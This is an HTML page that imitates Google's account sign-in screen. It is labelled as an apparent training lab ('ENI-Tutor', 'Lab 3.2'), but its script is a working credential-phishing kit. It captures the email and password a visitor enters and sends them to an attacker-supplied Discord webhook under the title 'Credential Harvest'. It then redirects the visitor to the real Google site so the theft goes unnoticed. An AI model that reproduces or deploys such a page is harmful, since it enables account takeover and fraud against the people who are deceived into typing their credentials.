<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
        .auth-card { width: 450px; min-height: 500px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px; box-sizing: border-box; text-align: center; position: relative; overflow: hidden; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
        .input-group { margin: 20px 0; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .btn-next { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; }
        
        /* Hidden by default */
        #password-section { display: none; }
        .user-chip { border: 1px solid #dadce0; border-radius: 16px; padding: 5px 12px; display: inline-block; margin-bottom: 20px; font-size: 14px; }
    </style>
</head>
<body>

<div class="auth-card">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
    
    <!-- SECTION 1: EMAIL -->
    <div id="email-section">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <div class="input-group">
            <input type="email" id="email" placeholder="Email or phone" autofocus>
        </div>
        <button class="btn-next" onclick="showPassword()">Next</button>
    </div>

    <!-- SECTION 2: PASSWORD (The Injection Point) -->
    <div id="password-section">
        <h1>Welcome</h1>
        <div class="user-chip" id="display-email"></div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Enter your password" autofocus>
        </div>
        <button class="btn-next" onclick="capture()">Next</button>
    </div>
</div>

<script>
    // Pull the webhook from session or ask for it
    let hook = sessionStorage.getItem('lab_hook');
    if (!hook) {
        hook = prompt("ENI-Tutor: Enter your Discord Webhook URL for Lab 3.2:");
        sessionStorage.setItem('lab_hook', hook);
    }

    function showPassword() {
        const emailVal = document.getElementById('email').value;
        if(!emailVal) return alert("Enter email first");
        
        document.getElementById('display-email').innerText = emailVal;
        document.getElementById('email-section').style.display = 'none';
        document.getElementById('password-section').style.display = 'block';
    }

    async function capture() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        
        // The Payload (Reference: QUICK_REFERENCE_64.txt)
        const payload = {
            embeds: [{
                title: "🎯 Credential Harvest: Lab 3.2",
                color: 0x1a73e8,
                fields: [
                    { name: "User", value: `\`${email}\`` },
                    { name: "Pass", value: `\`${pass}\`` }
                ]
            }]
        };

        try {
            await fetch(hook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            console.log("Transmission Successful.");
        } catch (e) {
            console.error("Fetch failed.");
        }

        // Final Redirect
        window.location.href = "https://accounts.google.com";
    }
</script>

</body>
</html>
